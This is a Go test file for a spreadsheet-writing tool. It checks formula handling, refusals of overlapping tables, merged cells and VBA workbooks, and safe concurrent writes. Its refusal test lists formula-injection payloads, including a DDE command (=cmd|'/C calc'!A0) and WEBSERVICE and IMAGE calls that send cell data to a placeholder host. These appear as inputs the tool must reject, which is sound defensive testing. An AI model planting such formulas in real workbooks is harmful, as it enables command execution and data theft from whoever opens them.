package xls

import (
	"archive/zip"
	"bytes"
	"context"
	"fmt"
	"io"
	"math"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"testing"

	"github.com/xuri/excelize/v2"
	"neui.dev/api"
	"neui.dev/internal/testkit"
)

func TestWrite(t *testing.T) {
	ctl := testkit.NewController(t, testkit.Setup{})
	fs := ctl.FS()
	buildBook(t, fs, "book.xlsx")
	ctx := ctl.Ctx()
	res, err := writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "E1", Rows: [][]any{{"Triple", "Flag", nil, "n"}}})
	if err != nil {
		t.Fatal(err)
	}
	if res.Range != "E1:H1" {
		t.Fatalf("result = %+v", res)
	}
	res, err = writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "E2", Rows: [][]any{{"=B{row}*3", true, nil, 7.5}}, Repeat: 3})
	if err != nil {
		t.Fatal(err)
	}
	if res.Range != "E2:H4" {
		t.Fatalf("result = %+v", res)
	}
	f := reopen(t, fs, "book.xlsx")
	if v, _ := f.GetCellValue("Data", "E1"); v != "Triple" {
		t.Fatalf("E1 = %q", v)
	}
	for _, c := range []struct{ cell, want string }{{"E2", "B2*3"}, {"E3", "B3*3"}, {"E4", "B4*3"}} {
		if fl, _ := f.GetCellFormula("Data", c.cell); fl != c.want {
			t.Fatalf("%s formula = %q, want %q", c.cell, fl, c.want)
		}
	}
	if v, _ := f.CalcCellValue("Data", "E3"); v != "60" {
		t.Fatalf("E3 = %q", v)
	}
	if v, _ := f.GetCellValue("Data", "F4"); v != "TRUE" {
		t.Fatalf("F4 = %q", v)
	}
	if v, _ := f.GetCellValue("Data", "G3"); v != "" {
		t.Fatalf("G3 = %q", v)
	}
	if v, _ := f.GetCellValue("Data", "H2", excelize.Options{RawCellValue: true}); v != "7.5" {
		t.Fatalf("H2 = %q", v)
	}
	if v, _ := f.GetCellValue("Data", "B2", excelize.Options{RawCellValue: true}); v != "10.5" {
		t.Fatalf("B2 = %q", v)
	}
	calc, err := f.GetCalcProps()
	if err != nil {
		t.Fatal(err)
	}
	if calc.FullCalcOnLoad == nil || !*calc.FullCalcOnLoad {
		t.Fatal("fullCalcOnLoad not set")
	}
}

func TestWriteKeepsOtherCachedValues(t *testing.T) {
	c := testkit.NewController(t, testkit.Setup{})
	fs := c.FS()
	f := excelize.NewFile()
	for cell, v := range map[string]any{"A1": "N", "B1": "Twice", "A2": 1, "A3": 2, "B2": 2, "B3": 4} {
		if err := f.SetCellValue("Sheet1", cell, v); err != nil {
			t.Fatal(err)
		}
	}
	if err := f.SetCellFormula("Sheet1", "B2", "A2*2"); err != nil {
		t.Fatal(err)
	}
	writeBook(t, fs, "book.xlsx", f)
	if _, err := writeTool(c.Ctx(), writeArg{Path: "book.xlsx", Sheet: "Sheet1", Cell: "C2", Rows: [][]any{{"=A{row}*3"}}, Repeat: 2}); err != nil {
		t.Fatal(err)
	}
	g := reopen(t, fs, "book.xlsx")
	if v, _ := g.GetCellValue("Sheet1", "B2", excelize.Options{RawCellValue: true}); v != "2" {
		t.Fatalf("unrelated cached value = %q, want 2", v)
	}
	if v, _ := g.GetCellValue("Sheet1", "C2", excelize.Options{RawCellValue: true}); v != "" {
		t.Fatalf("C2 cached value %q", v)
	}
}

func TestWriteRefusesNonEmpty(t *testing.T) {
	c := testkit.NewController(t, testkit.Setup{})
	fs := c.FS()
	buildBook(t, fs, "book.xlsx")
	_, err := writeTool(c.Ctx(), writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "C2", Rows: [][]any{{nil, "x"}}})
	if err == nil || !strings.Contains(err.Error(), "not empty") || !strings.Contains(err.Error(), "C2") {
		t.Fatalf("err = %v", err)
	}
	_, err = writeTool(c.Ctx(), writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "D3", Rows: [][]any{{"=1"}}, Repeat: 1})
	if err != nil {
		t.Fatal(err)
	}
	_, err = writeTool(c.Ctx(), writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "D3", Rows: [][]any{{"=2"}}})
	if err == nil || !strings.Contains(err.Error(), "not empty") {
		t.Fatalf("formula cell err = %v", err)
	}
	f := reopen(t, fs, "book.xlsx")
	if v, _ := f.GetCellValue("Data", "C2", excelize.Options{RawCellValue: true}); v != "45000" {
		t.Fatalf("C2 = %q", v)
	}
	if fl, _ := f.GetCellFormula("Data", "D3"); fl != "1" {
		t.Fatalf("D3 = %q", fl)
	}
}

func TestWriteRefusals(t *testing.T) {
	ctl := testkit.NewController(t, testkit.Setup{})
	fs := ctl.FS()
	ctx := ctl.Ctx()
	if _, err := tableTool(ctx, tableArg{Path: "book.xlsx", Sheet: "Data", Columns: []columnSpec{{Header: "K"}, {Header: "V"}}, Rows: [][]any{{"a", "x"}, {"b"}}, Name: "T"}); err != nil {
		t.Fatal(err)
	}
	f := reopen(t, fs, "book.xlsx")
	for cell, v := range map[string]any{"E1": "N", "F1": "P", "E2": "a", "F2": 1} {
		if err := f.SetCellValue("Data", cell, v); err != nil {
			t.Fatal(err)
		}
	}
	if err := f.AutoFilter("Data", "E1:F4", nil); err != nil {
		t.Fatal(err)
	}
	if err := f.MergeCell("Data", "H1", "I2"); err != nil {
		t.Fatal(err)
	}
	ref, kind := "K1:K2", "array"
	if err := f.SetCellFormula("Data", "K1", "A1:A2", excelize.FormulaOpts{Ref: &ref, Type: &kind}); err != nil {
		t.Fatal(err)
	}
	path, err := fs.LocalPath(context.Background(), "book.xlsx")
	if err != nil {
		t.Fatal(err)
	}
	if err := f.SaveAs(path); err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct {
		cell string
		rows [][]any
		want string
	}{
		{"B3", [][]any{{"z", "z"}}, "partly overlaps table"},
		{"B3", [][]any{{"z"}, {"z"}}, "partly overlaps table"},
		{"F4", [][]any{{1.0, 1.0}}, "partly overlaps the autofilter"},
		{"G2", [][]any{{1.0, 1.0}}, "merged cells H1:I2"},
		{"K2", [][]any{{1.0}}, "array formula at K1:K2"},
		{"M1", [][]any{{"=SORT(A1:A3)"}}, "SORT is a dynamic-array"},
		{"M1", [][]any{{"=SUM(_xlfn.XLOOKUP(1,A:A,B:B))"}}, "XLOOKUP is a dynamic-array"},
		{"M1", [][]any{{"=[Budget.xlsx]Sheet1!A1"}}, "external links"},
		{"M1", [][]any{{"='C:\\\\x\\\\[Old.xls]S'!A1"}}, "external links"},
		{"M1", [][]any{{"=WEBSERVICE(\"https://x.test/?\"&A1)"}}, "external links"},
		{"M1", [][]any{{"=_xlfn.FILTERXML(A1,\"//a\")"}}, "external links"},
		{"M1", [][]any{{"=rtd(\"x\",,\"y\")"}}, "external links"},
		{"M1", [][]any{{"=CALL(\"k\",\"f\",\"J\")"}}, "external links"},
		{"M1", [][]any{{"=REGISTER.ID(\"k\",\"f\")"}}, "external links"},
		{"M1", [][]any{{"=cmd|'/C calc'!A0"}}, "external links"},
		{"M1", [][]any{{"=IMAGE(\"https://x.test/?\"&A1)"}}, "external links"},
		{"M1", [][]any{{"='a\"b'!A1&WEBSERVICE(\"x\")&\"c\""}}, "external links"},
		{"M1", [][]any{{"=\"it''s\"&WEBSERVICE(\"x\")&\"'\""}}, "external links"},
		{"M1", [][]any{{"=\"say \"\"hi\"\"\"&WEBSERVICE(A1)"}}, "external links"},
		{"M1", [][]any{{"=SUM(1)+MAP(A1:A3,LAMBDA(x,x))"}}, "MAP is a dynamic-array, LAMBDA"},
		{"M1", [][]any{{"=GROUPBY(A1:A3,B1:B3,SUM)"}}, "GROUPBY is a dynamic-array"},
		{"M1", [][]any{{"=REGEXTEST(A1,\"a\")"}}, "REGEXTEST is a dynamic-array"},
		{"M1", [][]any{{map[string]any{"a": 1}}}, "not a cell value"},
		{"M1", [][]any{{"= "}}, "is empty"},
		{"M1", [][]any{{}}, "no cells"},
		{"XFD1", [][]any{{1.0, 2.0}}, "does not fit"},
		{"M1", [][]any{{1}}, "int is not a cell value"},
	} {
		_, err := writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Data", Cell: c.cell, Rows: c.rows})
		if err == nil || !strings.Contains(err.Error(), c.want) {
			t.Fatalf("%s %v: err = %v, want %q", c.cell, c.rows, err, c.want)
		}
	}
	if _, err := writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "B3", Rows: [][]any{{"y"}}}); err != nil {
		t.Fatalf("inside table: %v", err)
	}
	if _, err := writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "E3", Rows: [][]any{{"c", 2.0}}}); err != nil {
		t.Fatalf("inside autofilter: %v", err)
	}
	g := reopen(t, fs, "book.xlsx")
	tables, err := g.GetTables("Data")
	if err != nil {
		t.Fatal(err)
	}
	if len(tables) != 1 || tables[0].Range != "A1:B3" {
		t.Fatalf("tables = %+v", tables)
	}
	if v, _ := g.GetCellValue("Data", "B3"); v != "y" {
		t.Fatalf("B3 = %q", v)
	}
}

func TestWriteFutureFunctions(t *testing.T) {
	ctl := testkit.NewController(t, testkit.Setup{})
	fs := ctl.FS()
	buildBook(t, fs, "book.xlsx")
	ctx := ctl.Ctx()
	rows := [][]any{{
		"=IFS(B{row}>15,\"big\",TRUE,\"small\")",
		"=textjoin(\",\",TRUE,A2:A4)",
		"=_xlfn.MAXIFS(B2:B4,A2:A4,\"<>\")&\"IFS(x)|y\"",
		"=IFNA(SWITCH(B{row},10.5,1,0),0)+STDEV.S(B2:B4)*0+DAYS360(1,2)*0",
		"=IFERROR(IFS(IFS(TRUE,TRUE),1),0)",
	}}
	if _, err := writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "E2", Rows: rows}); err != nil {
		t.Fatal(err)
	}
	f := reopen(t, fs, "book.xlsx")
	for _, c := range []struct{ cell, formula, value string }{
		{"E2", `_xlfn.IFS(B2>15,"big",TRUE,"small")`, "small"},
		{"F2", `_xlfn.TEXTJOIN(",",TRUE,A2:A4)`, "Alice,Bob,Cara"},
		{"G2", `_xlfn.MAXIFS(B2:B4,A2:A4,"<>")&"IFS(x)|y"`, "30IFS(x)|y"},
		{"H2", `_xlfn.IFNA(_xlfn.SWITCH(B2,10.5,1,0),0)+_xlfn.STDEV.S(B2:B4)*0+DAYS360(1,2)*0`, "1"},
		{"I2", `IFERROR(_xlfn.IFS(_xlfn.IFS(TRUE,TRUE),1),0)`, "1"},
	} {
		if fl, _ := f.GetCellFormula("Data", c.cell); fl != c.formula {
			t.Fatalf("%s formula = %q, want %q", c.cell, fl, c.formula)
		}
		if v, err := f.CalcCellValue("Data", c.cell); err != nil || v != c.value {
			t.Fatalf("%s = %q, %v, want %q", c.cell, v, err, c.value)
		}
	}
	if _, err := writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "E3", Rows: [][]any{{"=HYPERLINK(\"https://x.test\",\"site\")"}}}); err != nil {
		t.Fatalf("hyperlink: %v", err)
	}
	if _, err := writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "E4", Rows: [][]any{{"=SUM('Q1|Q2'!A1)", "='IFS (old)'!A1+IFS(TRUE,1)"}}}); err != nil {
		t.Fatalf("quoted sheet names: %v", err)
	}
	f = reopen(t, fs, "book.xlsx")
	if fl, _ := f.GetCellFormula("Data", "F4"); fl != "'IFS (old)'!A1+_xlfn.IFS(TRUE,1)" {
		t.Fatalf("F4 formula = %q", fl)
	}
}

func TestFormulaPrefixesIntlAndCeiling(t *testing.T) {
	fl, err := formula("=NETWORKDAYS.INTL(A1,A2)+workday.intl(A1,1)+ISO.CEILING(1)+ECMA.CEILING(1,1)")
	if err != nil {
		t.Fatal(err)
	}
	if want := "_xlfn.NETWORKDAYS.INTL(A1,A2)+_xlfn.WORKDAY.INTL(A1,1)+_xlfn.ISO.CEILING(1)+_xlfn.ECMA.CEILING(1,1)"; fl != want {
		t.Fatalf("formula = %q, want %q", fl, want)
	}
}

func TestWriteRefusesHugeRepeat(t *testing.T) {
	c := testkit.NewController(t, testkit.Setup{})
	fs := c.FS()
	buildBook(t, fs, "book.xlsx")
	_, err := writeTool(c.Ctx(), writeArg{Path: "book.xlsx", Sheet: "Data", Cell: "E2", Rows: [][]any{{1.0}}, Repeat: math.MaxUint64})
	if err == nil || !strings.Contains(err.Error(), "repeat") {
		t.Fatalf("err = %v", err)
	}
}

func TestWriteRefusesVBA(t *testing.T) {
	c := testkit.NewController(t, testkit.Setup{})
	fs := c.FS()
	f := excelize.NewFile()
	buf, err := f.WriteToBuffer()
	if err != nil {
		t.Fatal(err)
	}
	f.Close()
	zr, err := zip.NewReader(bytes.NewReader(buf.Bytes()), int64(buf.Len()))
	if err != nil {
		t.Fatal(err)
	}
	w, err := fs.Create("book.xlsx")
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(w)
	for _, zf := range zr.File {
		if err := zw.Copy(zf); err != nil {
			t.Fatal(err)
		}
	}
	part, err := zw.Create("xl/vbaProject.bin")
	if err != nil {
		t.Fatal(err)
	}
	part.Write([]byte("vba"))
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	ctx := c.Ctx()
	_, err = writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Sheet1", Cell: "A1", Rows: [][]any{{1.0}}})
	if err == nil || !strings.Contains(err.Error(), "VBA") {
		t.Fatalf("err = %v", err)
	}
	if _, err := sheetsTool(ctx, sheetsArg{Path: "book.xlsx"}); err != nil {
		t.Fatalf("read: %v", err)
	}
}

func mustRead(t *testing.T, name string) []byte {
	t.Helper()
	b, err := os.ReadFile(name)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func TestWriteConcurrent(t *testing.T) {
	c := testkit.NewController(t, testkit.Setup{})
	fs := c.FS()
	buildBook(t, fs, "book.xlsx")
	ctx := c.Ctx()
	var wg sync.WaitGroup
	errs := make(chan error, 8)
	for i := range 8 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			_, err := writeTool(ctx, writeArg{Path: "book.xlsx", Sheet: "Data", Cell: fmt.Sprintf("F%d", i+1), Rows: [][]any{{float64(i)}}})
			errs <- err
		}()
	}
	wg.Wait()
	close(errs)
	for err := range errs {
		if err != nil {
			t.Fatal(err)
		}
	}
	f := reopen(t, fs, "book.xlsx")
	for i := range 8 {
		if v, _ := f.GetCellValue("Data", fmt.Sprintf("F%d", i+1)); v != fmt.Sprint(i) {
			t.Fatalf("F%d = %q", i+1, v)
		}
	}
	if len(locks) != 0 {
		t.Fatalf("locks left: %d", len(locks))
	}
}

func excelFixture(t *testing.T, fs api.FS, name string) {
	t.Helper()
	w, err := fs.Create(name)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(w)
	root := filepath.Join("testdata", "excel")
	err = filepath.WalkDir(root, func(p string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		rel, err := filepath.Rel(root, p)
		if err != nil {
			return err
		}
		part, err := zw.Create(filepath.ToSlash(rel))
		if err != nil {
			return err
		}
		_, err = part.Write(mustRead(t, p))
		return err
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
}

func readPart(t *testing.T, fs api.FS, name, part string) string {
	t.Helper()
	path, err := fs.LocalPath(context.Background(), name)
	if err != nil {
		t.Fatal(err)
	}
	z, err := zip.OpenReader(path)
	if err != nil {
		t.Fatal(err)
	}
	defer z.Close()
	r, err := z.Open(part)
	if err != nil {
		t.Fatal(err)
	}
	defer r.Close()
	var b bytes.Buffer
	if _, err := io.Copy(&b, r); err != nil {
		t.Fatal(err)
	}
	return b.String()
}

func TestExcelFixtureKeptByWrites(t *testing.T) {
	c := testkit.NewController(t, testkit.Setup{})
	fs := c.FS()
	excelFixture(t, fs, "excel.xlsx")
	ctx := c.Ctx()
	infos, err := sheetsTool(ctx, sheetsArg{Path: "excel.xlsx"})
	if err != nil {
		t.Fatal(err)
	}
	if len(infos) != 2 || infos[0].Filter != "A1:C4" || infos[1].Filter != "" || len(infos[1].Tables) != 1 || infos[1].Tables[0].Range != "A1:B4" {
		t.Fatalf("infos = %+v", infos)
	}
	if _, err := writeTool(ctx, writeArg{Path: "excel.xlsx", Sheet: "Data", Cell: "E1", Rows: [][]any{{"Note"}, {"=B{row}+1"}}}); err != nil {
		t.Fatal(err)
	}
	if _, err := totalTool(ctx, totalArg{Path: "excel.xlsx", Sheet: "Data", Range: "A1:C4", Aggs: []aggSpec{{Column: "Amount", Fn: "sum"}}}); err != nil {
		t.Fatal(err)
	}
	if _, err := writeTool(ctx, writeArg{Path: "excel.xlsx", Sheet: "Sales", Cell: "D1", Rows: [][]any{{"Share"}, {"=B{row}/B4"}}}); err != nil {
		t.Fatal(err)
	}
	if _, err := tableTool(ctx, tableArg{Path: "excel.xlsx", Sheet: "Sales", Cell: "F1", Columns: []columnSpec{{Header: "K"}}, Rows: [][]any{{"a"}}}); err != nil {
		t.Fatal(err)
	}
	if _, err := totalTool(ctx, totalArg{Path: "excel.xlsx", Sheet: "Sales", Range: "A1:B4", Aggs: []aggSpec{{Column: "Amount", Fn: "sum"}}}); err == nil || !strings.Contains(err.Error(), "is table") {
		t.Fatalf("total on table: %v", err)
	}
	data := readPart(t, fs, "excel.xlsx", "xl/worksheets/sheet1.xml")
	for _, want := range []string{`<tabColor rgb="FF00B050"`, `<sheetPr filterMode="(1|true)"`, `<autoFilter ref="A1:C4"`, `<customFilter operator="greaterThan" val="15"`, `<row r="2"[^>]* hidden="(1|true)"`, `width="14.7109375"`} {
		if !regexp.MustCompile(want).MatchString(data) {
			t.Fatalf("sheet1 lost %s:\n%s", want, data)
		}
	}
	table := readPart(t, fs, "excel.xlsx", "xl/tables/table1.xml")
	for _, want := range []string{`ref="A1:B4"`, `totalsRowCount="1"`, `totalsRowFunction="sum"`, `totalsRowLabel="Total"`} {
		if !strings.Contains(table, want) {
			t.Fatalf("table1 lost %s:\n%s", want, table)
		}
	}
	f := reopen(t, fs, "excel.xlsx")
	if fl, _ := f.GetCellFormula("Sales", "B4"); fl != "SUBTOTAL(109,Sales[Amount])" {
		t.Fatalf("total row formula = %q", fl)
	}
	if fl, _ := f.GetCellFormula("Data", "B5"); fl != "SUBTOTAL(109,B2:B4)" {
		t.Fatalf("Data total = %q", fl)
	}
	sid, err := f.GetCellStyle("Data", "B5")
	if err != nil {
		t.Fatal(err)
	}
	st, err := f.GetStyle(sid)
	if err != nil {
		t.Fatal(err)
	}
	if st.CustomNumFmt == nil || !strings.Contains(*st.CustomNumFmt, "#,##0.00") {
		t.Fatalf("Data total style = %+v", st)
	}
	panes, err := f.GetPanes("Sales")
	if err != nil {
		t.Fatal(err)
	}
	if panes.Freeze {
		t.Fatalf("panes changed: %+v", panes)
	}
}
